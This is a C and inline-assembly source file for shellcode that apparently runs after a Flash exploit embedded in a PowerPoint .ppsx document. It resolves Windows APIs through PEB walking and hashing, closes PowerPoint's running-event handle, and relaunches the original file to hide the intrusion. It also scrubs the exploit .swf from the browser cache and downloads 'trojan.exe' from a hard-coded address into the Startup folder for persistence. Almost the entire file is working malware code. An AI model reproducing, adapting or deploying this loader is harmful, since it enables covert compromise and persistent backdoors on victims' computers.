#include <Windows.h>
#include <Winternl.h>
#include <ShlObj.h>

#pragma section(".loader", read,execute)
#pragma code_seg(".loader")

#include "loader.h"
#include "crt.h"

 #pragma optimize( "", off )
__declspec(allocate(".loader"))
struct __strings _STRINGS =
{
	//NULL, NULL, 0x8f900864, // SHELLCODE gadget
	{ 'N', 'T', 'D', 'L', 'L', 0x00 },
	{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', 0x0 },
	{ 'u', 's', 'e', 'r', '3', '2', 0x0 },
	{ 's', 'h', 'e', 'l', 'l', '3', '2', 0x0 },
	{ 'U', 'R', 'L', 'M', 'O', 'N', 0x00 },
	{ 'W', 'I', 'N', 'I', 'N', 'E', 'T', 0x0 },

	{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 },
	{ 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x0 },
	{ 'S', 'l', 'e', 'e', 'p', 0x0 },
	{ 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 },
	{ 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'W', 0x0 },
	{ 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'F', 'i', 'l', 'e', 0x0 },
	{ 'S', 'h', 'e', 'l', 'l', 'E', 'x', 'e', 'c', 'u', 't', 'e', 'W', 0x0 },
	{ 'U', 'R', 'L', 'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 'T', 'o', 'F', 'i', 'l', 'e', 'A', 0x00 },
	{ 'S', 'H', 'G', 'e', 't', 'S', 'p', 'e', 'c', 'i', 'a', 'l', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 'A', 0x00 },
	{ 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'D', 'e', 'l', 'e', 't', 'e', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 0x0 },
	{ 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'O', 'b', 'j', 'e', 'c', 't', 0x0 },
	{ 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 },
	{ 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'A', 0x0},


	{ '.', 's', 'w', 'f', 0x0 },

	{ L'\\', L'P', L'P', L'1', 0x0 },
	{ L'R', L'u', L'n', L'n', L'i', L'n', L'g', 0x0 },

	{ L'.', L'd', L'o', L'c', L'x', L'\0' },
	{ L'.', L'D', L'O', L'C', L'X', L'\0' },
	{ L'.', L'p', L'p', L's', L'x', L'\0' }, 
	{ L'.', L'P', L'P', L'S', L'X', L'\0' },

	{ L'/', L'q', L' ', L'/', L'f', L' ', L'"', L'\0' },
	{ L'/', L's', L' ', L'"', L'\0' },

	{ L'\\', L'~', L'$', L'\0' },
	{ L'"', L'\0' },

};

__declspec(allocate(".loader"))
 struct __config _CONFIG = 
{
	{ sizeof(STARTUPINFOA), NULL, NULL, NULL, NULL, NULL, NULL, NULL,	NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL}, 
	{ NULL, NULL, NULL, NULL },
	{ 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '8', 
	'.', '1', ':', '8', '0', '8', '0', '/', 't', 'r', 'o', 'j', 'a', 'n', '.', 'e', 
	'x', 'e', 0x00, 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	0x00, 0x00, 0x00, 0x00 },
	{ '\\', 'b', 'a', 'd', 'l', 'l', '.', 'e', 'x', 'e', 0x00, 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	0x00, 0x00, 0x00, 0x00 },
};

__declspec(allocate(".loader")) 
VTABLE vTable =
{
	NULL, NULL, (OUTPUTDEBUGSTRINGA)0x8f900864, // SHELLCODE gadget
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

__declspec(naked) VOID Startup()
{
	_asm 
	{
		// make sure the next call is 4-byte aligned!
		nop
		nop
		nop
start:
		call next			// shellcode gadget, non toccare
next:
		pop eax				// shellcode gadget
		and eax, 0xfffff000 // shellcode gadget

		// FIXME:  <4k 
		lea esi, vTable
		and esi, 0x00000fff
		add esi, eax

		lea edi, _CONFIG
		and edi, 0x00000fff
		add edi, eax

		lea ecx, _STRINGS
		and ecx, 0x00000fff
		add ecx, eax

		push ecx
		push edi
		push esi
		call LoaderEntryPoint
	}
}

VOID RemoveCachedObject(PVTABLE lpTable, LPSTR strUrl, BOOL isSubString)
{
	if (!isSubString)
	{
		if (!lpTable->DeleteUrlCacheEntryA(strUrl))
		{
			lpTable->Sleep(1000);
			lpTable->DeleteUrlCacheEntryA(strUrl);
		}
		return;
	}

	DWORD dwLen = 0x1000;
	LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFOA) lpTable->VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	HANDLE hCache = lpTable->FindFirstUrlCacheEntryA(NULL, lpCacheEntry, &dwLen);
	if (hCache == NULL)
		return;
	do
	{
		if (__STRSTRI__(lpCacheEntry->lpszSourceUrlName, strUrl))
			if (!lpTable->DeleteUrlCacheEntryA(lpCacheEntry->lpszSourceUrlName))
				lpTable->DeleteUrlCacheEntryA(lpCacheEntry->lpszSourceUrlName);
	
		dwLen = 0x1000;
	}
	while (lpTable->FindNextUrlCacheEntryA(hCache, lpCacheEntry, &dwLen));

	lpTable->FindCloseUrlCache(hCache);
}

VOID LoaderEntryPoint(struct __vtbl *VTBL, struct __config *config, struct __strings *strings)
{ 
	DWORD dwOut;
	VTABLE lpTable;

	if (!GetVTable(&lpTable, strings))
		return; // FIXME

	IO_STATUS_BLOCK pIO;
	PFILE_NAME_INFORMATION lpFileNameInfo = (PFILE_NAME_INFORMATION) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	PFILE_NAME_INFORMATION lpEventNameInfo = (PFILE_NAME_INFORMATION) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	
	BOOL dwOriginalFile = FALSE;
	BOOL dwEventClosed = FALSE;

	for (UINT i=0; i<0xffff; i++)
	{		
		__MEMSET__(lpEventNameInfo, 0x0, 0x1000);
		if (dwEventClosed == FALSE && lpTable.NtQueryObject((HANDLE)i, (OBJECT_INFORMATION_CLASS)1, lpEventNameInfo, 0x1000, &dwOut) == 0)
		{
			if (lpEventNameInfo->FileNameLength > 0 && __STRSTRIW__(lpEventNameInfo->FileName, strings->strPPRunning1) && __STRSTRIW__(lpEventNameInfo->FileName, strings->strPPRunning2))
			{
				lpTable.CloseHandle((HANDLE)i); // chiude handle a PP1*Running_***
				dwEventClosed = TRUE;
			}
		}

		if (dwOriginalFile == FALSE)
		{
			DWORD dwHighSize = 0;
			DWORD dwLowSize = lpTable.GetFileSize((HANDLE)i, &dwHighSize); // ha una size ?
			if (dwLowSize == INVALID_FILE_SIZE)
				continue;

			__MEMSET__(lpFileNameInfo, 0x0, 0x1000);
			if (lpTable.NtQueryInformationFile((HANDLE)i, &pIO, lpFileNameInfo, 0x1000, (FILE_INFORMATION_CLASS)9)) // ha un nome?
				continue;
			if (!__STRSTRIW__(lpFileNameInfo->FileName, strings->strPPSX)) // .ppsx?
				continue;\
			if (__STRSTRIW__(lpFileNameInfo->FileName, strings->strTmp)) // != temp file
				continue;
	
			dwOriginalFile = TRUE;
		}

		if (dwOriginalFile && dwEventClosed)
			break;

	}

	// prima di lanciare la nuova istanza, zapppiamo l'swf dalla cache cosi' non va in loop mortale ritriggherando l'exploit
	RemoveCachedObject(&lpTable, strings->strSWFSuffix, TRUE);

	// prepara gli argomenti per la ShellExecute
	LPWSTR strArgs = (LPWSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	__MEMSET__(strArgs, 0x0, 0x1000);
	__STRCATW__(strArgs, strings->strPPTArgs);
	__STRCATW__(strArgs, lpFileNameInfo->FileName);
	__STRCATW__(strArgs, strings->strQuote);

	// lancia office
	LPWSTR strExe = (LPWSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	lpTable.GetModuleFileNameW(NULL, strExe, 0x1000);
	lpTable.ShellExecuteW(NULL, NULL, strExe, strArgs, NULL, 0);
		
	// download exe
	LPSTR strStartupPath = (LPSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	LPSTR strShortPath = (LPSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	
	// dest path
	lpTable.SHGetSpecialFolderPathA(NULL, strStartupPath, CSIDL_STARTUP, TRUE);
	lpTable.GetShortPathNameA(strStartupPath, strShortPath, 0x1000/sizeof(WCHAR));
	__STRCAT__(strShortPath, config->szBackdoorPath);

	lpTable.URLDownloadToFileA(NULL, config->szUrl, strShortPath, NULL, NULL);
	
	// cancella  l'exe dalla cache
	RemoveCachedObject(&lpTable, config->szUrl, FALSE);

	// exit
	lpTable.ExitProcess(0);
}

BOOL GetVTable(__out PVTABLE lpTable, struct __strings *_strings)
{
	
	if (!GetPointers(&lpTable->GetProcAddress, &lpTable->LoadLibraryA))
		return FALSE; // FIXME

	// KERNEL32
	lpTable->VirtualAlloc = (VIRTUALALLOC) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strVirtualAlloc);
	lpTable->GetFileSize = (GETFILESIZE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetFileSize);
	lpTable->CloseHandle  = (CLOSEHANDLE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strCloseHandle);
	lpTable->Sleep  = (SLEEP) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strSleep);
	lpTable->ExitProcess = (EXITPROCESS) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strExitProcess);
	lpTable->GetModuleFileNameW = (GETMODULEFILENAMEW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetModuleFileNameW);
	lpTable->GetShortPathNameA = (GETSHORTPATHNAMEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetShortPathNameA);

	// NTDLL
	lpTable->NtQueryInformationFile = (NTQUERYINFORMATIONFILE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strZwQueryInformationFile);
	lpTable->NtQueryObject = (NTQUERYOBJECT) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strNtQueryObject);

	// SHELL32
	lpTable->ShellExecuteW = (SHELLEXECUTEW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strShell32), _strings->strShellExecuteW);
	lpTable->SHGetSpecialFolderPathA = (SHGETSPECIALFOLDERPATHA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strShell32), _strings->strSHGetSpecialFolderPathA);

	// WININET
	lpTable->FindFirstUrlCacheEntryA = (FINDFIRSTURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindFirstUrlCacheEntryA);
	lpTable->FindNextUrlCacheEntryA = (FINDNEXTURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindNextUrlCacheEntryA);
	lpTable->DeleteUrlCacheEntryA = (DELETEURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strDeleteUrlCacheEntryA);
	lpTable->FindCloseUrlCache = (FINDCLOSEURLCACHE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindCloseUrlCache);

	// URLMON
	lpTable->URLDownloadToFileA = (URLDOWNLOADTOFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strUrlMon), _strings->strUrlDownloadToFileA);

	return TRUE;
}

HANDLE GetKernel32Handle()
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
	PPEB lpPeb = (PPEB) __readfsdword(0x30);
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;	

#ifdef SUX_KERNEL32_HANDLE
	hKernel32 = 
		(CONTAINING_RECORD(pListEntry->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))->DllBase;
#elif defined FAST_KERNEL32_HANDLE
	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;
			PWCHAR strName = (pModEntry->FullDllName.Buffer + (dwLen/sizeof(WCHAR))) - 13;

			if (GetStringHash(strName, TRUE, 13) == 0x8fecdbff || GetStringHash(strName, TRUE, 13) == 0x6e2bcfd7)
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}
#else
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;

			__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
			strDllName[dwLen/sizeof(WCHAR)] = L'\0';

			if (__STRSTRIW__(strDllName, strKernel32))
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}

#endif

	return hKernel32;
}

BOOL GetPointers(
	__out PGETPROCADDRESS fpGetProcAddress, 
	__out PLOADLIBRARYA fpLoadLibraryA)
{
	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	LPBYTE lpBaseAddr = (LPBYTE) hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr +  pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray  = (LPWORD) (lpBaseAddr+ pExportDir->AddressOfNameOrdinals);

	*fpGetProcAddress = NULL;
	*fpLoadLibraryA = NULL;

#ifdef FAST_POINTERS
	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);
	
		if (GetStringHash(pFuncName, FALSE, 14) == 0x7c0dfcaa) 
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (GetStringHash(pFuncName, FALSE, 12) == 0xec0e4e8e)
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
	
		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#else
	CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	for (UINT i=0; i<pExportDir->NumberOfNames; i++)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);

		if (!__STRCMPI__(pFuncName, strGetProcAddress))
			*fpGetProcAddress = (GETPROCADDRESS) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		else if (!__STRCMPI__(pFuncName, strLoadLibraryA))
			*fpLoadLibraryA = (LOADLIBRARYA) (lpBaseAddr + pAddrArray[pOrdArray[i]]);

		if (*fpGetProcAddress && *fpLoadLibraryA)
			return TRUE;
	}
#endif

	return FALSE;
}

DWORD GetStringHash(
	__in LPVOID lpBuffer, 
	__in BOOL bUnicode, 
	__in UINT uLen)
{
	DWORD dwHash = 0;
	LPSTR strBuffer = (LPSTR) lpBuffer;

	while (uLen--)
    {
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash +=  (DWORD)*strBuffer++;

		if (bUnicode)
				strBuffer++;			
    }
    return dwHash;
}
#pragma optimize( "", on ) 
// CRT
BOOL __ISUPPER__(__in CHAR c) { return ('A' <= c) && (c <= 'Z'); };
CHAR __TOLOWER__(__in CHAR c) { return __ISUPPER__(c) ? c - 'A' + 'a' : c ; };

UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while(lpStr1[i] != 0x0)
		i++;

	return i;
}

UINT __STRLENW__(__in LPWSTR lpStr1)
{
	UINT i = 0;
	while(lpStr1[i] != L'\0')
		i++;

	return i;
}

LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
{
	CHAR c = __TOLOWER__((lpStr2++)[0]);
	if (!c)
		return lpStr1;

	UINT dwLen = __STRLEN__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__((lpStr1++)[0]);
			if (!sc)
				return NULL;
		}
		while (sc != c);
	}
	while(__STRNCMPI__(lpStr1, lpStr2, dwLen) != 0);

	return (lpStr1 - 1); // FIXME: -0?
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;

	UINT dwLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		}
		while (sc != c);
	}
	while(__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);

	return (lpStr1 - 1); // FIXME -2 ?
}

INT __STRCMPI__(
	__in LPSTR lpStr1, 
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter & char is signed 
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	}
	while ((v == 0) && (c1 != '\0') && (c2 != '\0') );
	return v;
}

INT __STRNCMPI__(
	__in LPSTR lpStr1, 
	__in LPSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do
	{
		dwLen--;
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	}
	while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
	return v;
}

INT __STRNCMPIW__(
	__in LPWSTR lpStr1, 
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
	} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);

	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest, 
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;

	while(*d) d++;
	
	do { *d++ = *s++; } while(*s);
	*d = 0x0;

	return strDest;
}


LPWSTR __STRCATW__(
	__in LPWSTR	strDest, 
	__in LPWSTR strSource)
{
	LPWSTR d = strDest;
	LPWSTR s = strSource;

	while(*d != L'\0') d++;
	do { *d++ = *s++; } while (*s != L'\0');
	*d = L'\0';

	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst, 
	__in LPVOID lpSrc, 
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE) lpSrc;
	LPBYTE d = (LPBYTE) lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}

#pragma optimize( "", off ) 
VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize)
{
	for (UINT i=0; i<dwSize; i++)
		((PCHAR)p)[i] = cValue;
}
#pragma optimize( "", off ) 

/*
INT __STRCMPIW__(
__in LPWSTR lpStr1, 
__in LPWSTR lpStr2)
{
int  v;
CHAR c1, c2;
do {
c1 = ((PCHAR)lpStr1++)[0];
c2 = ((PCHAR)lpStr2++)[0];
// The casts are necessary when pStr1 is shorter & char is signed 
v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
} while ((v == 0) && (c1 != '\0') && (c2 != '\0') );
return v;
}

INT __STRNCMPIW__(
__in LPWSTR lpStr1, 
__in LPWSTR lpStr2,
__in DWORD dwLen)
{
int  v;
CHAR c1, c2;
do {
dwLen--;
c1 = ((PCHAR)lpStr1++)[0];
c2 = ((PCHAR)lpStr2++)[0];
// The casts are necessary when pStr1 is shorter & char is signed 
v = (UINT) __TOLOWER__(c1) - (UINT) __TOLOWER__(c2);
} while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
return v;
}


LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
{
CHAR c = __TOLOWER__(*lpStr2++);
if (!c)
return lpStr1;

UINT dwLen = __STRLEN__(lpStr2);
do
{
CHAR sc;
do
{
sc = __TOLOWER__(*lpStr1++);
if (!sc)
return NULL;
}
while (sc != c);
}
while(__STRNCMPI__(lpStr1, lpStr2, dwLen) != 0);

return (lpStr1 - 1);
}




*/

VOID END_LOADER_DATA()
{
	return;
};